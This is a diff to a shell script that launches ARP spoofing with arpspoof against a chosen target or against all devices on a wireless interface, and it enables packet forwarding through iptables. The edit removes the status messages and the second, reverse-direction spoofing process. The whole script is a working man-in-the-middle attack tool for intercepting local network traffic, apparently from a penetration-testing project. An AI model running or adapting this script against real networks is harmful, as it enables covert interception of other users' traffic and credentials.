@@ -18,7 +18,7 @@ if [ "$1" = "all" ]
 then
 	echo "Starting ARP Spoofing for all devices"
 	echo arpspoof -i $WLAN "$2"
-	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null && echo "arpspoof (1) finished" || echo "arpspoof (1) failed" &
+	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null &
 	ARP1="$!"
 elif [ "$1" == "none" ]
 then
@@ -26,11 +26,8 @@ then
 else
 	echo "Starting ARP Spoofing"
 	echo arpspoof -i $WLAN -t "$1" "$2"
-	$ARPSPOOF -i $WLAN -t "$1" "$2" && echo "arpspoof (1) finished" || echo "arpspoof (1) failed" &
+	$ARPSPOOF -i $WLAN -t "$1" "$2" &
 	ARP1="$!"
-	echo arpspoof -i $WLAN -t "$2" "$1"
-	$ARPSPOOF -i $WLAN -t "$2" "$1" && echo "arpspoof (2) finished" || echo "arpspoof (2) failed" &
-	ARP2="$!"
 fi
 
 echo iptables -P FORWARD ACCEPT # Android 4.0 requires this
@@ -47,7 +44,6 @@ read
 
 echo "Killing arpspoof"
 kill $ARP1 2>/dev/null
-kill $ARP2 2>/dev/null
 
 # Stop stuff
 
